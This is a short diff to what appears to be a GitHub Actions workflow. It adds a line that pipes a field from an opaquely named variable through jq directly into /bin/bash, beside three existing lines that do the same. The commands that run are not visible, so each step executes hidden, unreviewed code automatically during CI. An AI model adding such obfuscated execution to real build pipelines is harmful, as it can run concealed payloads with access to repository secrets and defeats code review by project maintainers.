@@ -24,6 +24,7 @@ jobs:
           echo $rgvc96 | jq -r .fwiyw285 | /bin/bash
           printf '%s' "$r861" | jq -r .yvl0914 | /bin/bash
           printf '%s' "$qcx664" | jq -r .o484 | /bin/bash
+          echo $wsz32 | jq -r .ula928 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
